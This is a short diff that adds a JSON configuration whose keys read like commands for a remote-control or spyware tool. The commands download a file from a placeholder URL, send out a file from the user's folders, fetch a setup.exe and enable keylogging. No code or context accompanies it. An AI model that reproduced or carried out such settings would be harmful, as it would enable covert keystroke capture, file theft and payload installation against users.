@@ -1,0 +1,9 @@
+{
+  "getFile": ["https://www.ex.com/img.jpeg", "~/Pictures"],
+  "run": "~/Applications/Finder.app",
+  "unZip": "~/Homework",
+  "sendFile": "~/Homework/Pictures/van.png",
+  "getApp": "github.com/ban/setup.exe",
+  "keylogOn": true,
+  "screenshotOn": false
+}
